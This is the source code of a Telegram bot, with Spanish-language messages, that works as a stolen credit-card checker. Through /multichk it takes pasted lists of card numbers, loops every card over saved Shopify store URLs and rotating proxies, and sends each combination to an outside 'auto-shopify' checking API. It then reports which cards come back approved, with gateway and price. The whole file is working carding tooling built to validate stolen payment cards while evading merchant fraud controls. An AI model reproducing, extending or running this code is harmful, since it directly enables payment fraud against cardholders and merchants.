require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

/* ================== ENV ================== */
const BOT_TOKEN = process.env.BOT_TOKEN;
const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';

if (!BOT_TOKEN) {
  console.error('BOT_TOKEN no definido');
  process.exit(1);
}

/* ================== BOT ================== */
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

/* ================== DATA ================== */
const DATA_FILE = './data.json';
let data = fs.existsSync(DATA_FILE)
  ? JSON.parse(fs.readFileSync(DATA_FILE))
  : { sites: [], proxies: [] };

function saveData() {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

/* ================== RUNTIME ================== */
const running = {};

/* ================== API ================== */
async function callChkAPI({ site, cc, proxy }) {
  try {
    const res = await axios.get(API_BASE, {
      params: { site, cc, proxy },
      timeout: 30000
    });
    const d = res.data || {};
    const response = String(d.Response || '').toUpperCase();
    return {
      approved: response.includes('APPRO'),
      response: d.Response || 'NO_RESPONSE',
      gateway: d.Gateway || 'N/A',
      price: d.Price || 'N/A',
      cc
    };
  } catch {
    return { approved: false, response: 'API_ERROR', cc };
  }
}

/* ================== START ================== */
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`🤖 Bot activo

Comandos:
• /addconfig → agregar sites + proxies
• /multichk → ejecutar
• /stop → detener
• /status → ver estado`
  );
});

/* ================== STATUS ================== */
bot.onText(/\/status/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
`📊 Estado actual

🌐 Sites: ${data.sites.length}
🧰 Proxies: ${data.proxies.length}`
  );
});

/* ================== ADD CONFIG ================== */
bot.onText(/\/addconfig([\s\S]*)/, (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input || !input.includes('[SITES]') || !input.includes('[PROXIES]')) {
    return bot.sendMessage(
      chatId,
`❌ Formato incorrecto

Ejemplo:
\`\`\`
/addconfig
[SITES]
https://site1.com
https://site2.com

[PROXIES]
ip:port:user:pass
ip:port:user:pass
\`\`\``,
      { parse_mode: 'Markdown' }
    );
  }

  const sitesBlock = input.split('[SITES]')[1].split('[PROXIES]')[0];
  const proxiesBlock = input.split('[PROXIES]')[1];

  const sites = sitesBlock.split('\n').map(x => x.trim()).filter(Boolean);
  const proxies = proxiesBlock.split('\n').map(x => x.trim()).filter(Boolean);

  let addedSites = 0;
  let addedProxies = 0;

  for (const s of sites) {
    if (!data.sites.includes(s)) {
      data.sites.push(s);
      addedSites++;
    }
  }

  for (const p of proxies) {
    if (!data.proxies.includes(p)) {
      data.proxies.push(p);
      addedProxies++;
    }
  }

  saveData();

  bot.sendMessage(
    chatId,
`✅ Configuración guardada

🌐 Sites añadidos: ${addedSites}
🧰 Proxies añadidos: ${addedProxies}

Totales:
🌐 ${data.sites.length}
🧰 ${data.proxies.length}`
  );
});

/* ================== DELETE ================== */
bot.onText(/\/delsites (.+)/, (msg, match) => {
  const arg = match[1].trim();
  if (arg === 'all') {
    const c = data.sites.length;
    data.sites = [];
    saveData();
    return bot.sendMessage(msg.chat.id, `🌐 Sites eliminados: ${c}`);
  }
});

bot.onText(/\/delproxies (.+)/, (msg, match) => {
  const arg = match[1].trim();
  if (arg === 'all') {
    const c = data.proxies.length;
    data.proxies = [];
    saveData();
    return bot.sendMessage(msg.chat.id, `🧰 Proxies eliminados: ${c}`);
  }
});

/* ================== MULTI-CHK ================== */
bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!data.sites.length || !data.proxies.length) {
    return bot.sendMessage(chatId, '❌ No hay sites o proxies');
  }

  const input = match[1].trim();
  if (!input) return bot.sendMessage(chatId, '❌ Envía tarjetas');

  const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
  running[chatId] = true;

  const total = data.sites.length * data.proxies.length * ccs.length;
  let done = 0, approved = 0, declined = 0;

  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${total}`);

  for (const site of data.sites) {
    for (const proxy of data.proxies) {
      for (const cc of ccs) {
        if (!running[chatId]) break;

        const r = await callChkAPI({ site, cc, proxy });
        if (r.approved) {
          approved++;
          await bot.sendMessage(chatId,
`━━━━━━━━━━━━━━
💳 ${r.cc}
🏪 ${r.gateway}
💰 ${r.price}
✅ ${r.response}`);
        } else declined++;

        done++;
        try {
          await bot.editMessageText(
            `⏳ ${done}/${total}\n✅ ${approved} ❌ ${declined}`,
            { chat_id: chatId, message_id: progressMsg.message_id }
          );
        } catch {}
      }
    }
  }

  running[chatId] = false;

  bot.sendMessage(chatId,
`✅ Finalizado
Total: ${total}
Aprobadas: ${approved}
Rechazadas: ${declined}`);
});

/* ================== STOP ================== */
bot.onText(/\/stop/, (msg) => {
  running[msg.chat.id] = false;
  bot.sendMessage(msg.chat.id, '⛔ Proceso detenido');
});
